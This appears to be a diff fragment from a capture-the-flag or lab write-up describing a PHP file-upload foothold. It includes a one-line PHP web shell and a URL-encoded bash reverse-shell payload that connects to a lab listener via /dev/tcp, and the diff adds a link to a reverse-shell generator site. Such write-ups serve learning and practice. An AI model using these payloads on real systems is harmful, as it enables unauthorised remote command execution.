@@ -139,7 +139,8 @@ try uploading simple php shell `<?php system($_REQUEST['cmd']); ?>` and it is no
 ![image](https://github.com/Aftab700/Writeups/assets/79740895/08e0c9d1-2522-4e8a-9fc3-4a19c13bc969)
 
 
-we can get reverse shell by this payload `cmd=bash+-c+"bash+-i+>%26+/dev/tcp/192.168.0.207/9001+0>%261"`
+we can get reverse shell by this payload `cmd=bash+-c+"bash+-i+>%26+/dev/tcp/192.168.0.207/9001+0>%261"` \
+reference: https://www.revshells.com
 
 ![image](https://github.com/Aftab700/Writeups/assets/79740895/4dc9b13a-e0a3-4ff4-82fd-5a32fb2b0270)
 
